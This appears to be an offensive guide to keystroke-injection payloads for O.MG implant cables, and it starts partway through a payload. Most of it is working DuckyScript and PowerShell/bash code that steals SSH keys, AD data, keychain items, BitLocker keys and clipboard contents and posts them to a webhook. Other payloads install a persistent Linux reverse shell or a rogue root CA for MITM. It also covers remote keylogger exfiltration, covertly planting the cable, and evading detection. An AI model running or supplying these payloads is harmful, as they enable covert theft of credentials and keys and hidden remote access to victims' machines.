    $_OS = #NOT_WINDOWS
    VAR $MAX_TRIES = #MAX_WAIT
    WHILE (($_RECEIVED_HOST_LOCK_LED_REPLY == FALSE) && ($MAX_TRIES > 0))
        DELAY #CHECK_INTERVAL
        $MAX_TRIES = ($MAX_TRIES - 1)
    END_WHILE
    IF ($_HOST_CONFIGURATION_REQUEST_COUNT > #WINDOWS_HOST_REQUEST_COUNT) THEN
        $_OS = WINDOWS
    END_IF
END_EXTENSION

IF ($_OS == WINDOWS) THEN
    GUI r
    DELAY 500
    STRINGLN powershell -w h -NoP -NonI -Exec Bypass
    DELAY 1000
    REM Collect SSH keys and config
    STRING $sshDir = "$env:USERPROFILE\.ssh"; $data = "=== SSH Keys ===`n"; if(Test-Path $sshDir){ Get-ChildItem $sshDir -File | ForEach-Object { $data += "`n--- $($_.Name) ---`n" + (Get-Content $_.FullName -Raw) + "`n" }}; $data += "`n=== Known Hosts ===`n"; if(Test-Path "$sshDir\known_hosts"){ $data += Get-Content "$sshDir\known_hosts" -Raw }
    ENTER
    DELAY 1000
    STRING Invoke-WebRequest '#WEBHOOK' -Method POST -Body (@{content=$data.Substring(0,[Math]::Min($data.Length,1900))}|ConvertTo-Json) -ContentType 'application/json'
    ENTER
    DELAY 2000
    STRINGLN exit
ELSE
    REM macOS / Linux
    DELAY 2000
    INJECT_MOD COMMAND
    DELAY 500
    STRINGLN terminal
    DELAY 1000
    STRINGLN tar czf /tmp/.sshbak.tgz ~/.ssh 2>/dev/null && curl -X POST -F "file=@/tmp/.sshbak.tgz" #WEBHOOK && rm /tmp/.sshbak.tgz
    DELAY 3000
    STRINGLN exit
END_IF
```

## Payload: Active Directory Enumeration

```
REM Title: ADQuickEnum
REM Description: Runs AD enumeration (domain, users, groups, DCs, trusts)
REM              and exfiltrates results. No tools required — uses built-in commands.
REM Target: Windows 10/11 (domain-joined)

DEFINE #WEBHOOK https://webhook.site/YOUR-ID

ATTACKMODE HID

EXTENSION DETECT_READY
    DEFINE #RESPONSE_DELAY 25
    DEFINE #ITERATION_LIMIT 120
    VAR $C = 0
    WHILE (($_CAPSLOCK_ON == FALSE) && ($C < #ITERATION_LIMIT))
        CAPSLOCK
        DELAY #RESPONSE_DELAY
        $C = ($C + 1)
    END_WHILE
    CAPSLOCK
END_EXTENSION

GUI r
DELAY 500
STRINGLN powershell -w h -NoP -NonI -Exec Bypass
DELAY 1000

REM Gather AD info using built-in cmdlets (no BloodHound/PowerView needed)
STRING $d = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain(); $info = "Domain: $($d.Name)`nDCs: $($d.DomainControllers.Name -join ', ')`nForest: $($d.Forest.Name)`n"
ENTER
DELAY 500

REM Enumerate domain admins
STRING $info += "`n=== Domain Admins ===`n"; $searcher = New-Object DirectoryServices.DirectorySearcher([ADSI]""); $searcher.Filter = "(&(objectCategory=group)(cn=Domain Admins))"; $da = $searcher.FindOne(); $da.Properties.member | ForEach-Object { $info += "$_`n" }
ENTER
DELAY 1000

REM Enumerate computers
STRING $searcher.Filter = "(objectCategory=computer)"; $comps = $searcher.FindAll(); $info += "`n=== Computers ($($comps.Count) total) ===`n"; $comps | Select-Object -First 50 | ForEach-Object { $info += "$($_.Properties.cn)`n" }
ENTER
DELAY 1000

REM Enumerate users
STRING $searcher.Filter = "(&(objectCategory=user)(objectClass=user))"; $users = $searcher.FindAll(); $info += "`n=== Users ($($users.Count) total) ===`n"; $users | Select-Object -First 50 | ForEach-Object { $info += "$($_.Properties.samaccountname) | $($_.Properties.mail)`n" }
ENTER
DELAY 1000

REM Exfil
STRING Invoke-WebRequest '#WEBHOOK' -Method POST -Body (@{content=$info.Substring(0,[Math]::Min($info.Length,1900))}|ConvertTo-Json) -ContentType 'application/json'
ENTER
DELAY 2000
STRINGLN exit
```

## Payload: macOS Keychain & System Recon

```
REM Title: macOS-Recon-Keychain
REM Description: Runs system enumeration on macOS, attempts to dump keychain items,
REM              and exfiltrates results. Uses osascript for stealth.
REM Target: macOS

DEFINE #WEBHOOK https://webhook.site/YOUR-ID

ATTACKMODE HID

EXTENSION PASSIVE_WINDOWS_DETECT
    DEFINE #MAX_WAIT 150
    DEFINE #CHECK_INTERVAL 20
    DEFINE #WINDOWS_HOST_REQUEST_COUNT 2
    DEFINE #NOT_WINDOWS 7
    $_OS = #NOT_WINDOWS
    VAR $MAX_TRIES = #MAX_WAIT
    WHILE (($_RECEIVED_HOST_LOCK_LED_REPLY == FALSE) && ($MAX_TRIES > 0))
        DELAY #CHECK_INTERVAL
        $MAX_TRIES = ($MAX_TRIES - 1)
    END_WHILE
    IF ($_HOST_CONFIGURATION_REQUEST_COUNT > #WINDOWS_HOST_REQUEST_COUNT) THEN
        $_OS = WINDOWS
    END_IF
END_EXTENSION

IF ($_OS != WINDOWS) THEN
    REM macOS — open Terminal via Spotlight
    DELAY 2000
    INJECT_MOD COMMAND
    DELAY 500
    STRING terminal
    DELAY 200
    ENTER
    DELAY 1500

    REM Gather system info
    STRINGLN info=$(sw_vers && echo "---" && whoami && echo "---" && id && echo "---" && ifconfig | grep "inet " && echo "---" && networksetup -listallhardwareports && echo "---" && ls /Applications/ && echo "---" && security dump-keychain -d 2>/dev/null | head -200); curl -s -X POST -d "$info" #WEBHOOK; exit
END_IF

REM Note: security dump-keychain -d will prompt the user for keychain password
REM For stealth, omit the -d flag (dumps metadata without passwords)
REM Or use: security find-generic-password -ga "Chrome" 2>&1 | grep password
REM   (prompts for keychain unlock — may alert the user)
```

## Payload: Linux Reverse Shell with Persistence

```
REM Title: LinuxReverseShellPersist
REM Description: Deploys a reverse shell on Linux with cron-based persistence.
REM              Uses bash built-ins and cron — no external tools needed.
REM Target: Linux (Ubuntu, Debian, Fedora, etc.)

DEFINE #LHOST 10.10.14.5
DEFINE #LPORT 4444

ATTACKMODE HID

EXTENSION PASSIVE_WINDOWS_DETECT
    DEFINE #MAX_WAIT 150
    DEFINE #CHECK_INTERVAL 20
    DEFINE #WINDOWS_HOST_REQUEST_COUNT 2
    DEFINE #NOT_WINDOWS 7
    $_OS = #NOT_WINDOWS
    VAR $MAX_TRIES = #MAX_WAIT
    WHILE (($_RECEIVED_HOST_LOCK_LED_REPLY == FALSE) && ($MAX_TRIES > 0))
        DELAY #CHECK_INTERVAL
        $MAX_TRIES = ($MAX_TRIES - 1)
    END_WHILE
    IF ($_HOST_CONFIGURATION_REQUEST_COUNT > #WINDOWS_HOST_REQUEST_COUNT) THEN
        $_OS = WINDOWS
    END_IF
END_EXTENSION

IF ($_OS != WINDOWS) THEN
    REM Open terminal (Ctrl+Alt+T on most Linux DEs)
    CTRL-ALT t
    DELAY 1500

    REM Create hidden beacon script
    STRINGLN echo '#!/bin/bash' > ~/.config/.updater && echo 'while true; do bash -i >& /dev/tcp/#LHOST/#LPORT 0>&1 2>/dev/null; sleep 300; done' >> ~/.config/.updater && chmod +x ~/.config/.updater

    REM Add cron persistence (reconnects every 5 minutes)
    DELAY 500
    STRINGLN (crontab -l 2>/dev/null; echo "*/5 * * * * ~/.config/.updater") | crontab -

    REM Execute immediately
    DELAY 500
    STRINGLN nohup ~/.config/.updater &>/dev/null & disown; exit
END_IF
```

## Payload: Network Enumeration & Port Scan

```
REM Title: NetworkRecon
REM Description: Enumerates local network (ARP table, routes, listening ports,
REM              DNS servers, nearby hosts) and exfiltrates. No admin required.
REM Target: Windows 10/11

DEFINE #WEBHOOK https://webhook.site/YOUR-ID

ATTACKMODE HID

EXTENSION DETECT_READY
    DEFINE #RESPONSE_DELAY 25
    DEFINE #ITERATION_LIMIT 120
    VAR $C = 0
    WHILE (($_CAPSLOCK_ON == FALSE) && ($C < #ITERATION_LIMIT))
        CAPSLOCK
        DELAY #RESPONSE_DELAY
        $C = ($C + 1)
    END_WHILE
    CAPSLOCK
END_EXTENSION

GUI r
DELAY 500
STRINGLN powershell -w h -NoP -NonI -Exec Bypass
DELAY 1000

REM Network enumeration
STRING $r = "=== IP Config ===`n" + (ipconfig /all | Out-String) + "`n=== ARP Table ===`n" + (arp -a | Out-String) + "`n=== Routes ===`n" + (route print | Select-String "0.0.0.0" | Out-String) + "`n=== Listening Ports ===`n" + (netstat -ano | Select-String "LISTENING" | Out-String) + "`n=== DNS Cache ===`n" + (Get-DnsClientCache | Select-Object Entry,Data | Out-String)
ENTER
DELAY 3000

REM Quick subnet ping sweep (top 20 hosts)
STRING $subnet = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notmatch "Loopback"}).IPAddress -replace '\.\d+$','.'; $alive = ""; 1..254 | ForEach-Object -Parallel { if(Test-Connection "$using:subnet$_" -Count 1 -Quiet -TimeoutSeconds 1){ "$using:subnet$_" }} -ThrottleLimit 50 | ForEach-Object { $alive += "$_`n" }; $r += "`n=== Alive Hosts ===`n$alive"
ENTER
DELAY 10000

REM Exfil (truncate to webhook limits)
STRING Invoke-WebRequest '#WEBHOOK' -Method POST -Body (@{content=$r.Substring(0,[Math]::Min($r.Length,1900))}|ConvertTo-Json) -ContentType 'application/json'
ENTER
DELAY 2000
STRINGLN exit
```

## Payload: BitLocker Key Extraction

```
REM Title: BitLockerKeyExfil
REM Description: Extracts BitLocker recovery keys from the local system.
REM              On domain-joined machines, keys are often backed up to AD.
REM              Requires admin.
REM Target: Windows 10/11

DEFINE #WEBHOOK https://webhook.site/YOUR-ID

ATTACKMODE HID

EXTENSION DETECT_READY
    DEFINE #RESPONSE_DELAY 25
    DEFINE #ITERATION_LIMIT 120
    VAR $C = 0
    WHILE (($_CAPSLOCK_ON == FALSE) && ($C < #ITERATION_LIMIT))
        CAPSLOCK
        DELAY #RESPONSE_DELAY
        $C = ($C + 1)
    END_WHILE
    CAPSLOCK
END_EXTENSION

GUI r
DELAY 500
STRING powershell
CTRL-SHIFT ENTER
DELAY 2000
ALT y
DELAY 1000

REM Extract BitLocker recovery keys for all volumes
STRING $keys = "=== BitLocker Keys ===`n"; Get-BitLockerVolume | ForEach-Object { $vol = $_.MountPoint; $_.KeyProtector | Where-Object {$_.RecoveryPassword} | ForEach-Object { $keys += "Volume: $vol | ID: $($_.KeyProtectorId) | Key: $($_.RecoveryPassword)`n" }}; $keys += "`n=== TPM Info ===`n" + (Get-Tpm | Out-String)
ENTER
DELAY 2000

STRING Invoke-WebRequest '#WEBHOOK' -Method POST -Body (@{content=$keys}|ConvertTo-Json) -ContentType 'application/json'
ENTER
DELAY 2000
STRINGLN exit

REM Value: BitLocker recovery keys allow decryption of stolen hard drives
REM        or recovery of data from seized machines during physical engagements
```

## Payload: Rogue CA Certificate Installation

```
REM Title: RogueCA-Install
REM Description: Downloads and installs a rogue CA certificate into the Windows
REM              trusted root store. Enables MITM of all HTTPS traffic.
REM              Requires admin.
REM Target: Windows 10/11
REM Setup: Host your mitmproxy/Burp CA cert at the URL below

DEFINE #CERT_URL http://10.10.14.5/ca.cer

ATTACKMODE HID

EXTENSION DETECT_READY
    DEFINE #RESPONSE_DELAY 25
    DEFINE #ITERATION_LIMIT 120
    VAR $C = 0
    WHILE (($_CAPSLOCK_ON == FALSE) && ($C < #ITERATION_LIMIT))
        CAPSLOCK
        DELAY #RESPONSE_DELAY
        $C = ($C + 1)
    END_WHILE
    CAPSLOCK
END_EXTENSION

GUI r
DELAY 500
STRING powershell
CTRL-SHIFT ENTER
DELAY 2000
ALT y
DELAY 1000

REM Download CA cert and install to trusted root store
STRING Invoke-WebRequest '#CERT_URL' -OutFile "$env:TEMP\update.cer"; Import-Certificate -FilePath "$env:TEMP\update.cer" -CertStoreLocation Cert:\LocalMachine\Root; Remove-Item "$env:TEMP\update.cer" -Force
ENTER
DELAY 2000
STRINGLN exit

REM After installation:
REM - All HTTPS traffic can be intercepted by mitmproxy/Burp with matching CA
REM - Browser will not show certificate warnings
REM - Combine with rogue DHCP/DNS to redirect traffic through proxy
REM
REM Cleanup: certutil -delstore Root "THUMBPRINT_OF_ROGUE_CERT"
```

## Payload: Clipboard Monitor & Exfil

```
REM Title: ClipboardSpy
REM Description: Monitors clipboard for passwords, tokens, and sensitive data.
REM              Runs in background for 5 minutes, collecting clipboard contents,
REM              then exfiltrates and cleans up.
REM Target: Windows 10/11

DEFINE #WEBHOOK https://webhook.site/YOUR-ID
DEFINE #DURATION 300

ATTACKMODE HID

EXTENSION DETECT_READY
    DEFINE #RESPONSE_DELAY 25
    DEFINE #ITERATION_LIMIT 120
    VAR $C = 0
    WHILE (($_CAPSLOCK_ON == FALSE) && ($C < #ITERATION_LIMIT))
        CAPSLOCK
        DELAY #RESPONSE_DELAY
        $C = ($C + 1)
    END_WHILE
    CAPSLOCK
END_EXTENSION

GUI r
DELAY 500
STRINGLN powershell -w h -NoP -NonI -Exec Bypass
DELAY 1000

REM Background clipboard monitor
STRING Start-Job -ScriptBlock { $log = ""; $last = ""; $end = (Get-Date).AddSeconds(#DURATION); while((Get-Date) -lt $end){ $clip = Get-Clipboard -ErrorAction SilentlyContinue; if($clip -and $clip -ne $last){ $log += "[$(Get-Date -f 'HH:mm:ss')] $clip`n"; $last = $clip }; Start-Sleep -s 2 }; Invoke-WebRequest '#WEBHOOK' -Method POST -Body (@{content="Clipboard:`n$($log.Substring(0,[Math]::Min($log.Length,1900)))"}|ConvertTo-Json) -ContentType 'application/json' }
ENTER
DELAY 500
STRINGLN exit

REM The job runs in background for DURATION seconds
REM Every 2 seconds, checks if clipboard changed
REM After DURATION, posts all captured clipboard contents to webhook
REM Captures: copied passwords, tokens, URLs, code snippets, etc.
```

## O.MG Elite — Advanced Features

The Elite model (vs Basic) has an extended-range Wi-Fi antenna (100m+), a more capable processor, and firmware features that turn the cable into a persistent remote access implant rather than a one-shot keystroke injector.

### Geofenced Payloads

```
# Geofencing restricts payload execution to a specific physical location
# by checking for the presence of nearby Wi-Fi SSIDs before running.
# The cable scans for SSIDs on plug-in — if the target SSID is not seen,
# nothing executes. Prevents accidental execution on your own machine
# and limits payload firing to the target environment.

# Configure in the O.MG web UI:
# Payloads → [payload slot] → Geofence Settings
#   SSID: "CorpGuest" (or partial match)
#   Match type: exact / contains
#   Action if not matched: do nothing (safest)

# Use cases:
# - Ensure payload only runs inside the target building's Wi-Fi range
# - Prevent execution at airport, hotel, or your lab
# - Multi-target deployment: each cable geofenced to its intended building
```

### Automatic Keylogger Exfiltration

```
# The Elite can push captured keystrokes to a remote endpoint automatically
# without requiring you to connect to the cable's own Wi-Fi AP.
# This enables long-term implant use — drop the cable, retrieve data remotely.

# Configure in O.MG web UI:
# Keylogger → Settings → Exfil Target
#   URL: https://your-callback-server.com/log
#   Method: POST
#   Trigger: on disconnect / on interval / on threshold

# The cable connects to a configured Wi-Fi network (set in Wi-Fi Settings)
# and POSTs the keylogger buffer to your server when triggered.

# Server to receive logs (simple Python):
# from flask import Flask, request
# app = Flask(__name__)
# @app.route('/log', methods=['POST'])
# def receive():
#     open('keys.txt','a').write(request.data.decode())
#     return 'ok', 200
# app.run(host='0.0.0.0', port=443, ssl_context='adhoc')

# Operational setup:
# 1. Pre-configure the cable to join the target's Wi-Fi (if known) or a rogue AP
# 2. The cable associates when the target machine is connected to that SSID
# 3. Keylog data exfils automatically — you never need physical proximity again
```

### Remote Trigger via Phone (O.MG App)

```
# The O.MG iOS/Android app provides a polished interface for managing
# cables in the field without opening a browser.

# App capabilities:
# - Connect to cable's Wi-Fi AP
# - Browse, edit, and trigger payload slots
# - View keylogger output in real time
# - Push firmware updates OTA
# - Configure geofencing and exfil settings

# Extended-range operation (Elite antenna):
# The Basic cable's Wi-Fi AP reaches ~10m
# The Elite's internal antenna reaches 100m+ in open air
# Trigger payloads from a car in the parking lot

# Operational pattern:
# 1. Social engineer or physically plant cable (charging station, IT closet, desk)
# 2. Walk away — stay within 100m (parking lot, adjacent office, lobby)
# 3. Wait for target to plug in cable → watch for LED flash (if enabled)
# 4. Open O.MG app → connect → execute payload
# 5. Retrieve keylogger data before leaving area
```

### Multi-Payload Slot Management

```
# The O.MG Elite supports multiple independent payload slots
# Each slot can have different:
#   - DuckyScript payload
#   - Geofence rule
#   - Execution mode (auto / manual / scheduled)
#   - Attack mode (HID / STORAGE / HID+STORAGE)

# Recommended slot layout:
# Slot 1: DETECT_READY + minimal recon (hostname, user, IP → webhook)
#         Auto-execute — fires immediately on any plug
# Slot 2: Full reverse shell payload
#         Manual trigger — execute when conditions are right
# Slot 3: Keylogger enable
#         Auto-execute — always capture keystrokes
# Slot 4: SAM dump (HID+STORAGE mode)
#         Manual trigger — only when admin session confirmed

# Switch active slot remotely via app without physical access
```

### O.MG Elite vs Basic vs Plug vs Adapter

```
O.MG Cable Elite
  Form factor:  Lightning / USB-C / USB-A cable
  Wi-Fi range:  100m+ (external PCB antenna inside)
  Keylogger:    Yes
  Exfil:        Yes (Wi-Fi push)
  Geofence:     Yes
  Price:        ~$180

O.MG Cable Basic
  Form factor:  Lightning / USB-C / USB-A cable
  Wi-Fi range:  ~10m (internal PCB antenna)
  Keylogger:    Yes
  Exfil:        Manual retrieval only
  Geofence:     Yes (firmware 3.0+)
  Price:        ~$120

O.MG Plug
  Form factor:  USB-A plug adapter (wall charger-style)
  Wi-Fi range:  ~10m
  Keylogger:    Yes
  Payload:      Same DuckyScript 3.0 support
  Use case:     Permanent install in charging port

O.MG Adapter
  Form factor:  USB-A to USB-A inline adapter (10mm long)
  Wi-Fi range:  ~10m
  Use case:     Insert between victim's cable and their device
                Victim uses their own cable — doesn't need to accept a new one
```

## OPSEC Considerations

```
REM Detection indicators (blue team):
# - New HID USB device appears (Event ID 2003 in Windows USB log)
# - Rapid keystroke activity seconds after USB plug-in
# - PowerShell spawned from explorer.exe with hidden window (-w h)
# - Network connection to external IP immediately after USB plug event
# - New process from %TEMP% within seconds of cable connection
# - LED flashing on the cable (use LED_OFF if available)

REM OPSEC improvements:
# 1. DETECT_READY instead of fixed DELAY → no wasted time, no premature keystrokes
# 2. PASSIVE_WINDOWS_DETECT → zero keystrokes during OS detection phase
# 3. JITTER 200 → randomizes delays to look more human
#    JITTER 200  (add before payload body — applies to all subsequent DELAYs)
# 4. Obfuscate PowerShell launch:
#    bad:  STRINGLN powershell -w h
#    better: use ROLLING_POWERSHELL_EXECUTION extension (randomizes invocation)
# 5. ATTACKMODE OFF at payload end → cable goes silent, harder to detect
# 6. Remote trigger via O.MG Wi-Fi → don't auto-execute on plug
#    Wait for opportune moment (screen unlocked, user away briefly)
# 7. Self-destruct after one run → no payload recoverable if cable is found
# 8. Exfil via DNS TXT or Discord webhook → bypasses web proxy logs
# 9. Keep initial DELAY or DETECT_READY ≥ 1500ms → avoid triggering HID defenses

REM Adding jitter to any payload:
JITTER 200
EXTENSION DETECT_READY
  ...
END_EXTENSION
REM All DELAYs after JITTER will have ±200ms random addition
```

## Resources

- O.MG Cable — `shop.hak5.org/collections/mischief-gadgets`
- O.MG Firmware Wiki — `github.com/O-MG/O.MG-Firmware/wiki`
- Hak5 USB Rubber Ducky payload library — `github.com/hak5/usbrubberducky-payloads`
- DuckyScript 3.0 documentation — `docs.hak5.org/hak5-usb-rubber-ducky`
- DuckyScript quick reference — `docs.hak5.org/hak5-usb-rubber-ducky/ducky-script-quick-reference`
- PayloadStudio (browser compiler for Rubber Ducky) — `payloadstudio.hak5.org`
- I-Am-Jakoby O.MG payload collection — `github.com/I-Am-Jakoby/hak5-submissions/tree/main/OMG`
- Webhook.site — free HTTP request inspection for testing exfil — `webhook.site`
- Interactsh — OOB interaction server (DNS + HTTP) — `github.com/projectdiscovery/interactsh`
